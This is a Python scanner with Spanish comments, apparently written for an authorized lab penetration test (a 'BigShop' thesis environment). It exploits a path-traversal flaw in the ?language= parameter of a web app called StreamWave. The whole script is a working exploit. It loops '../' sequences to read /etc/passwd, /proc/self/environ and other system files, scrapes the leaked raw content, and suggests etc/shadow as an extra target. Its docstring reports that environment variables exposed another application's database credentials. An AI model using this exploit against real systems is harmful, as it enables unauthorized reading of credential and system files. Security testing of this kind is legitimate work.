#!/usr/bin/env python3
"""
Escaner de Path Traversal / lectura arbitraria de ficheros en el parametro
?language= de StreamWave (BigShop / TFM). Ver Hallazgos/F-034.

Contexto:
  - El selector de idioma (GET /?language=...) carga un fichero de
    traducciones a partir del valor del parametro, sin sanear la ruta.
  - Si el fichero resultante no se puede parsear como JSON, la app muestra
    su contenido EN CRUDO en la pagina ("Language file could not be parsed
    as JSON -- raw content:").
  - No requiere autenticacion de ningun tipo.
  - /proc/self/environ revela variables de entorno reales, incluidas
    credenciales de base de datos de OTRA aplicacion del cliente
    (PixelForge, prefijo GS_ = GameStore) -- confirmado explotable.

Que hace este script:
  Prueba una lista de ficheros sensibles conocidos (ficheros de sistema,
  pseudo-ficheros /proc utiles para reconocimiento) contra el parametro
  ?language=, usando distintas profundidades de "../" para no depender de
  conocer el directorio de trabajo real del proceso, y reporta cuales
  devuelven contenido legible.

Uso:
    python3 streamwave_lfi_scan.py
    python3 streamwave_lfi_scan.py --base-url http://172.17.0.2:9090
    python3 streamwave_lfi_scan.py --extra-path etc/shadow,proc/version

Solo para uso en el laboratorio controlado BigShop (TFM), con autorizacion.
No usar contra sistemas sin autorizacion explicita. Este script solo LEE
ficheros via la aplicacion vulnerable -- no escribe ni modifica nada.
"""

import argparse
import re
import urllib.parse
import urllib.request

DEFAULT_BASE_URL = "http://172.17.0.2:9090"
TIMEOUT = 8

DEFAULT_TARGETS = [
    "etc/passwd",
    "etc/hostname",
    "etc/hosts",
    "proc/self/environ",
    "proc/self/cmdline",
    "proc/version",
    "proc/self/status",
]

RAW_BLOCK_RE = re.compile(
    r'raw content:</p>\s*<pre[^>]*>(.*?)</pre>', re.S
)


def fetch(base_url: str, depth: int, target: str):
    traversal = "../" * depth
    param = traversal + target
    url = f"{base_url}/?language={urllib.parse.quote(param)}"
    req = urllib.request.Request(url, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except Exception as e:
        return None


def extract_raw_content(body: str):
    if body is None:
        return None
    m = RAW_BLOCK_RE.search(body)
    if not m:
        return None
    content = m.group(1)
    # Deshacer el escapado HTML basico que aplica la plantilla al insertar el <pre>
    content = (content.replace("&lt;", "<").replace("&gt;", ">")
               .replace("&amp;", "&").replace("&quot;", '"'))
    return content.strip()


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--base-url", default=DEFAULT_BASE_URL)
    ap.add_argument("--max-depth", type=int, default=6,
                     help="Maximo numero de '../' a probar por cada fichero objetivo (por defecto 6)")
    ap.add_argument("--extra-path", default="",
                     help="Rutas adicionales a probar, separadas por comas (relativas a '/'), "
                          "ej. 'etc/shadow,proc/net/tcp'")
    args = ap.parse_args()

    targets = list(DEFAULT_TARGETS)
    if args.extra_path:
        targets += [p.strip() for p in args.extra_path.split(",") if p.strip()]

    print(f"[*] Objetivo: {args.base_url}  (sin autenticacion)")
    print(f"[*] Probando {len(targets)} ficheros, profundidad de '../' de 1 a {args.max_depth}\n")

    found_any = False
    for target in targets:
        hit = None
        for depth in range(1, args.max_depth + 1):
            body = fetch(args.base_url, depth, target)
            content = extract_raw_content(body)
            if content:
                hit = (depth, content)
                break
        if hit:
            found_any = True
            depth, content = hit
            preview = content[:300].replace("\n", "\\n")
            print(f"[+] LEGIBLE  /{target}  (profundidad {depth})")
            print(f"    {preview}{'...' if len(content) > 300 else ''}\n")
        else:
            print(f"[ ] no legible / no encontrado: /{target}")

    print()
    if found_any:
        print("[+] Al menos un fichero sensible fue legible. Revisar en detalle "
              "'proc/self/environ' si aparece en la lista -- puede contener "
              "credenciales reales de otros servicios del mismo host.")
    else:
        print("[!] Ningun fichero de la lista por defecto fue legible con esta profundidad. "
              "Prueba --max-depth mayor o --extra-path con otras rutas.")


if __name__ == "__main__":
    main()
